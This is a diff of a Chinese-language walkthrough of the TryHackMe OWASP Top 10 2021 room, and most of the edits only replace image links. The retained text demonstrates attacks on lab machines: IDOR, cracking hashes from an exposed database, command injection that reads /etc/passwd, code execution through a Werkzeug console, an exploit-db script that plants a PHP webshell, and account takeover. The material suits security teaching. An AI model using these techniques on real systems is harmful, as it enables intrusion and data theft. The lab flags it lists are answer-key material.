@@ -1,5 +1,6 @@
 ---
 description: 本文相关内容：了解并利用OWASP Top 10漏洞中的每一个，它们是十大最严重的Web安全风险。
+icon: check
 cover: ../../.gitbook/assets/2857591-20230614182517669-642644077.png
 coverY: 0
 layout:
@@ -22,11 +23,9 @@ layout:
 
 TryHackMe实验房间链接：[https://tryhackme.com/room/owasptop102021](https://tryhackme.com/room/owasptop102021)
 
-
-
 ## 简介
 
-
+<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 本文将对每个 OWASP 主题进行分析，并会包含关于漏洞主要原理、漏洞如何产生以及如何利用漏洞的详细信息。
 
@@ -45,11 +44,11 @@ TryHackMe实验房间链接：[https://tryhackme.com/room/owasptop102021](https:
 
 **本文使用的是OWASP TOP 10的2021年标准**。
 
-![image-20221205235710045](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205235710045.png)
+<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP1]失效的访问控制
 
-![image-20221205112914400](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205112914400.png)
+<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
 目标网站的某些页面可能会受到保护，从而不允许普通访问者对相关页面进行访问，例如，只有网站的管理员(admin)用户才能被允许访问用于管理其他用户的网站页面；如果目标网站的普通访问者能够访问他们无权查看的受保护页面，那么就代表目标站点的访问控制正处于失效状态。
 
@@ -72,11 +71,11 @@ IDOR或不安全的直接对象引用是指存在访问控制漏洞，我们可�
 
 例如，假设我们正在登录银行帐户，当正确验证了自己的身份之后，我们可能会看到这样的URL`https://bank.thm/account?id=111111`；在此页面上，我们可以看到自己银行帐户的所有重要详细信息，作为用户我们将会在该页面继续做一些我们想做的事情，并认为没有任何问题。
 
-![image-20240106005505612](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106005505612.png)
+<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
 然而，在上述页面中可能存在一个潜在的巨大问题，那就是我们可以尝试将`id`参数的值修改为`222222`或者其他值，然后再进行访问，如果网站的配置不正确，那么我们就可以成功访问到其他人的银行帐户信息。
 
-![image-20240106005516360](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106005516360.png)
+<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
 在刚才的例子中，相关Web应用程序通过URL中的`id`参数公开了直接对象引用，而该参数指向的是特定帐户，如果该Web应用程序不会检查已登录的用户是否有权访问被`id`参数所引用的帐户，那么攻击者就可以通过IDOR漏洞获取其他用户的敏感信息。
 
@@ -88,9 +87,9 @@ IDOR或不安全的直接对象引用是指存在访问控制漏洞，我们可�
 
 部署目标机器，使用攻击机的浏览器访问`http://MACHINE_IP` ，并且使用用户名`noot`和密码`test1234`进行登录操作。
 
-![image-20240106171911868](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106171911868.png)
+<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240106172004286](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106172004286.png)
+<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
 修改URL参数以尝试查看其他用户的notes：
 
@@ -100,11 +99,11 @@ tips：我们也可以使用FUZZ工具（如wfuzz）来进行测试--`?note_id=F
 
 发现只有0和1对应的响应码为200。
 
-![image-20240106172129192](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106172129192.png)
+<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 > 我们找到的flag内容为：flag{fivefourthree} 。
 
-![image-20240106172829202](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106172829202.png)
+<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP2]加密机制失效
 
@@ -135,7 +134,7 @@ tips：事实上，某些敏感数据可以直接在目标Web服务器本身上�
 
 假设我们已经成功地下载了一个数据库文件：
 
-![image-20240106220956338](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106220956338.png)
+<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
 
 ```shell
 user@linux$ ls -l 
@@ -147,7 +146,7 @@ example.db: SQLite 3.x database, last written using SQLite version 3039002, file
 
 我们可以看到当前文件夹中有一个SQLite数据库，为了访问该数据库，我们可以使用`sqlite3 <database-name>`命令语法：
 
-![image-20240106222748471](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106222748471.png)
+<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
 
 ```shell
 user@linux$ sqlite3 example.db                     
@@ -158,7 +157,7 @@ sqlite>
 
 然后我们可以继续使用`.tables`命令来查看数据库中的表：
 
-![image-20240106222900375](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106222900375.png)
+<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
 ```shell
 user@linux$ sqlite3 example.db                     
@@ -170,7 +169,7 @@ customers
 
 现在我们可以转储表中的所有数据，但是在不查看表信息的前提下，我们并不一定知道表中每列的含义；我们可以先使用`PRAGMA table_info(customers);`查看表信息，然后再使用`SELECT * FROM customers;`来从表中转储信息。
 
-![image-20240106230359645](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106230359645.png)
+<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
 
 ```
 sqlite> PRAGMA table_info(customers);
@@ -210,11 +209,11 @@ Crackstation网站非常擅长破解弱密码的哈希值，而对于更复杂�
 
 当我们导航到Crackstation网站时，我们会看到以下界面：
 
-![image-20221203225245851](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203225245851.png)
+<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 粘贴我们在上一小节中找到的 Joy Paulson 的密码哈希值(`5f4dcc3b5aa765d61d8327deb882cf99`) ，勾选验证码，然后点击“破解哈希”按钮即可：
 
-![image-20221203225511295](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203225511295.png)
+<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 我们看到哈希值被成功破解，目标用户的密码是“password”！
 
@@ -228,48 +227,48 @@ Crackstation网站非常擅长破解弱密码的哈希值，而对于更复杂�
 
 部署目标机器，使用攻击机的浏览器访问`http://MACHINE_IP:81/`( 10.10.206.41:81)，然后查看login页面的源代码，我们看到作者留下了一些评论，告诉我们`/assets`网站目录下有一个数据库文件：
 
-![image-20240109213001357](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213001357.png)
+<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109213051724](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213051724.png)
+<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109213136459](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213136459.png)
+<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
 
 我们继续通过浏览器的url地址栏导航到目标站点的`/assets`页面，就能找到相关的数据库文件`webapp.db`(点击该文件即可将其下载到攻击机上)：
 
-![image-20240109213242810](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213242810.png)
+<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109213443018](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213443018.png)
+<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
 
 通过浏览器下载好数据库文件之后，我们就可以在攻击机终端上使用命令`ls`和`file webapp.db`(验证所下载的文件是否为数据库文件)：
 
-![image-20240109213604353](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213604353.png)
+<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
 继续在攻击机终端输入命令`sqlitebrowser webapp.db`以便使用可视化客户端来打开数据库文件，然后我们就能直观地查看该数据库的用户表中的敏感信息：
 
-![image-20240109213707957](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213707957.png)
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109213817221](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213817221.png)
+<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
 
 > 在用户表中，admin用户所对应的密码hash值为：6eea9b7ef19179a06954edd0f6c05ceb
 
 接下来，我们可以使用以下网站进行在线hash破解操作：
 
-* https://crackstation.net/
-* https://hashes.com/en/decrypt/hash
+* &#x20;https://crackstation.net/
+* &#x20;https://hashes.com/en/decrypt/hash
 
-![image-20240109213926619](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213926619.png)
+<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
 
 > 经过hash破解得到admin的密码为：qwertyuiop
 
 最后，使用刚才经过hash破解所得到的明文密码信息以admin用户身份登录目标站点，一旦登录成功即可看到flag内容：
 
-![image-20240109214014730](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109214014730.png)
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109214041459](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109214041459.png)
+<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
 
 > 我们得到的flag为：THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} 。
 
-![image-20240109214228085](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109214228085.png)
+<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP3]注入
 
@@ -334,7 +333,7 @@ Crackstation网站非常擅长破解弱密码的哈希值，而对于更复杂�
 
 tips：如果你对`passthru()`函数感兴趣，可以参考PHP官网所提供的[相关文档](https://www.php.net/manual/en/function.passthru.php)以了解有关该函数的更多信息。
 
-![image-20240107204849107](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240107204849107.png)
+<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
 
 **利用命令注入漏洞**
 
@@ -344,11 +343,11 @@ Bash允许我们在命令中运行命令("inline commands-内联命令")，这�
 
 要执行Bash内联命令，我们需要使用特定的格式——`$(your_command_here)`；如果控制台检测到了内联命令的存在，就会先执行内联命令，然后再将相关的执行结果作为外部命令的参数。如下图所示，我们可以将`whoami`命令作为`echo`命令的内联命令执行：
 
-![image-20240107210010449](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240107210010449.png)
+<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
 
 回到我们在上文中所提及的cowsay示例服务器，如果我们向该Web应用程序发送内联命令，那么就会发生以下情况：
 
-![image-20240107210251435](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240107210251435.png)
+<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
 
 tips: perl /usr/bin/cowsay -f $cow $(mooing)
 
@@ -370,11 +369,11 @@ tips: perl /usr/bin/cowsay -f $cow $(mooing)
 
 部署目标虚拟机，并使用攻击机的浏览器导航到`http://MACHINE_IP:82/`(10.10.206.41:82)页面以尝试利用cowsay示例服务器。
 
-![image-20240109214427259](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109214427259.png)
+<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
 
 在Cowsay Online输入框中输入$(ls)以查看网站根目录下的文件：
 
-![image-20240109222305121](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222305121.png)
+<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
 
 > 可疑的文本文件为：drpepper.txt
 
@@ -382,7 +381,7 @@ tips: perl /usr/bin/cowsay -f $cow $(mooing)
 
 tip：按ctrl+f键可检索当前页面。
 
-![image-20240109220341909](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109220341909.png)
+<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
 
 > 发现没有非 root/非服务/非守护程序用户（标准用户）。
 >
@@ -390,13 +389,13 @@ tip：按ctrl+f键可检索当前页面。
 
 在Cowsay Online输入框中输入$(whoami)以查看当前应用程序以什么用户身份运行：
 
-![image-20240109220638316](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109220638316.png)
+<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
 
 继续使用$(cat /etc/passwd)列出用户并查看当前用户的shell设置：
 
 tip：按ctrl+f键可检索当前页面。
 
-![image-20240109221008958](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109221008958.png)
+<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
 
 > 当前应用程序以什么用户身份运行：apache
 >
@@ -406,13 +405,13 @@ tip：按ctrl+f键可检索当前页面。
 
 tips：也可以使用$(cat /etc/alpine-release)
 
-![image-20240109221257109](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109221257109.png)
+<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109221533079](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109221533079.png)
+<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
 
 > 运行当前应用程序的操作系统的版本为：3.16.0
 
-![image-20240109221558880](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109221558880.png)
+<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP4]不安全的设计
 
@@ -424,11 +423,11 @@ tips：也可以使用$(cat /etc/alpine-release)
 
 Instagram曾经出现过此类[不安全设计漏洞](https://thezerohack.com/hack-any-instagram)，它允许向用户的手机发送带有6位验证代码的短信，以便重置用户所忘记的密码；如果攻击者想要借助此机制访问受害者的帐户，那么攻击者就可能需要尝试暴力破解短信中的6位验证码，而这通常不可能直接实现(因为Instagram实施了速率限制措施，在250次验证尝试后，用户就会被阻止)。
 
-![image-20240108185718735](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108185718735.png)
+<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
 
 然而，我们发现Instagram所做的速率限制措施仅适用于来自同一个IP地址的验证尝试，如果攻击者使用多个不同的IP地址来发送请求进行，那么就可以突破250次验证尝试。对于6位验证码，有一百万种可能的组合，因此攻击者就需要使用1000000/250 = 4000 个 IP才能覆盖所有可能的验证码；这听起来攻击者似乎需要拥有大量的IP，但如果使用云服务则可以轻松地以相对较小的成本获取很多IP来使用，从而使得相关的攻击方式变得更加具有可行性。
 
-![image-20240108190808099](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108190808099.png)
+<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
 
 注意：出现上述漏洞的原因在于——应用程序设计者认为没有用户能够使用数千个 IP 地址发出并发请求来尝试暴力破解数字验证码。
 
@@ -438,31 +437,31 @@ Instagram曾经出现过此类[不安全设计漏洞](https://thezerohack.com/ha
 
 部署目标虚拟机，使用攻击机的浏览器导航到`http://MACHINE_IP:85`(10.10.206.41:85)页面，我们已知该应用程序的密码重置机制存在设计缺陷 ，接下来我们将找出具体的“不安全的设计”并尝试利用该漏洞(针对`joseph`用户帐户进行密码重置)。
 
-![image-20240109222416090](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222416090.png)
+<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109222458473](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222458473.png)
+<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109222552902](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222552902.png)
+<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
 
 通过对第二个密码保护问题进行猜测(Red, Orange, Yellow, Green, Blue, Indigo, 和Violet)，我们发现`green`是正确的密码保护答案，从而成功地重置了密码：
 
-![image-20240109222801040](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222801040.png)
+<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109222907400](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222907400.png)
+<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
 
 > lzwoWbRaAjLKUB
 
 我们使用重置得到的密码登录`joseph`用户帐户，然后查看flag内容即可：
 
-![image-20240109223038838](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223038838.png)
+<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109223140492](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223140492.png)
+<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109223151130](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223151130.png)
+<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
 
 > flag的内容为：THM{Not\_3ven\_c4tz\_c0uld\_sav3\_U!} 。
 
-![image-20240109223246705](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223246705.png)
+<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP5]安全配置错误
 
@@ -488,7 +487,7 @@ Instagram曾经出现过此类[不安全设计漏洞](https://thezerohack.com/ha
 
 据称，在[2015年Patreon遭到网络攻击](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/)时，黑客就利用了此类漏洞。在Patreon遭到网络攻击的五天前，一名安全人员向Patreon报告说——他发现了Werkzeug控制台的开放调试接口。Werkzeug是基于Python的Web应用程序中的重要组件，它能为Web服务器提供执行Python代码的接口；Werkzeug包含了一个调试控制台，在调试接口泄露的情况下，用户可以直接通过URL中的`/console`路径来访问该控制台，或者当应用程序引发异常时，该控制台也会呈现给用户。
 
-![image-20240108194303246](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108194303246.png)
+<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
 
 ### 答题
 
@@ -496,7 +495,7 @@ Instagram曾经出现过此类[不安全设计漏洞](https://thezerohack.com/ha
 
 我们可以使用浏览器访问`http://MACHINE_IP:86/console`页面以验证Werkzeug控制台是否泄露。
 
-![image-20240109223536803](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223536803.png)
+<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
 
 使用Werkzeug控制台运行以下Python代码，从而尝试在目标服务器上执行`ls -l`命令：
 
@@ -518,7 +517,7 @@ import os; print(os.popen("ls -l").read())
 
 我们可以看到，当前目录中的数据库文件名是什么？
 
-![image-20240109224054293](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109224054293.png)
+<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
 
 > 当前目录中的数据库文件名为：todo.db
 
@@ -528,11 +527,11 @@ import os; print(os.popen("ls -l").read())
 import os; print(os.popen("cat app.py").read())
 ```
 
-![image-20240109224310586](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109224310586.png)
+<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
 
 > 源代码中secret\_flag变量的值是：THM{Just\_a\_tiny\_misconfiguration} 。
 
-![image-20240109224342647](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109224342647.png)
+<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP6]自带缺陷和过时的组件
 
@@ -550,11 +549,11 @@ tips：在现实情况下，公司、企业往往很容易错过对应用程序�
 
 接下来，让我们通过一个Web应用程序示例来了解一下。
 
-![image-20240108200505003](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108200505003.png)
+<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
 
 假设目标服务器具有Nostromo Web服务器的默认页面，现在我们有了目标应用程序的版本号和软件名称，就可以使用[exploit-db](https://www.exploit-db.com/)来尝试找到这个特定版本的漏洞。
 
-![image-20240108200916884](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108200916884.png)
+<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
 
 > EXP链接：https://www.exploit-db.com/exploits/47837
 
@@ -631,13 +630,13 @@ uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
 
 首先在攻击机上使用浏览器访问`http://MACHINE_IP:84`(10.10.206.41:84)页面。
 
-![image-20240109225954149](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109225954149.png)
+<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
 
 在 https://www.exploit-db.com/ 中搜索目标应用程序(online book store)，并下载相关的EXP：
 
-![image-20240109230041674](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230041674.png)
+<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109230118608](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230118608.png)
+<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
 
 在攻击机上使用exp，指定目标url参数：
 
@@ -645,23 +644,23 @@ uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
 python 47887.py http://10.10.206.41:84/
 ```
 
-![image-20240109230541087](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230541087.png)
+<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
 
 使用我们所获得的shell查看`/opt/flag.txt`文件内容：
 
-![image-20240109230636813](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230636813.png)
+<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
 
 tips：执行上述exp，会将一个php webshell文件上传到`http://10.10.206.41:84/bootstrap/img/`目录下。
 
-![image-20240109231058189](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231058189.png)
+<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
 
 > /opt/flag.txt的内容为：THM{But\_1ts\_n0t\_my\_f4ult!} 。
 
-![image-20240109230722315](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230722315.png)
+<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP7]身份识别和身份验证错误
 
-![image-20240108205910872](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108205910872.png)
+<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
 
 身份验证和会话(session)管理构成了现代Web应用程序的核心组件。身份验证允许用户通过验证其身份来访问Web应用程序，最常见的身份验证形式是使用用户名和密码机制；用户需要输入密码凭据，然后服务器将验证它是否正确，如果用户所提供的凭据是正确的，那么服务器将向用户的本地浏览器提供一个会话cookie。之所以需要会话cookie，是因为Web服务器将使用无状态的HTTP(S)协议和客户端进行通信，通过附加会话cookie意味着服务器将知道是谁在发送什么数据，然后服务器就可以跟踪用户的操作。
 
@@ -691,29 +690,29 @@ tips：执行上述exp，会将一个php webshell文件上传到`http://10.10.20
 
 部署目标虚拟机，使用攻击机上的浏览器导航至`http://MACHINE_IP:8088`(10.10.206.41:8088)页面：
 
-![image-20240109231258782](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231258782.png)
+<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
 
 注册名为“ darren”的用户（注意此用户名开头含有空格），然后登录新用户帐户并查看flag内容：
 
-![image-20240109231421567](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231421567.png)
+<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109231545945](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231545945.png)
+<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109231559778](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231559778.png)
+<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
 
 > 在darren用户帐户中找到的flag是：fe86079416a21a3c99937fea8874b667
 
 验证一下能否以同样的方式查看arthur用户帐户中的信息：
 
-![image-20240109231849658](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231849658.png)
+<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109231955511](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231955511.png)
+<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109232013123](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232013123.png)
+<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
 
 > 在arthur用户帐户中找到的flag是：d9ac0f7db4fda460ac3edeb75d75e16e
 
-![image-20240109232102814](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232102814.png)
+<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP8]软件和数据完整性故障
 
@@ -729,7 +728,7 @@ tips：Hash是对一段数据应用特定的算法而产生的值，常见的哈
 
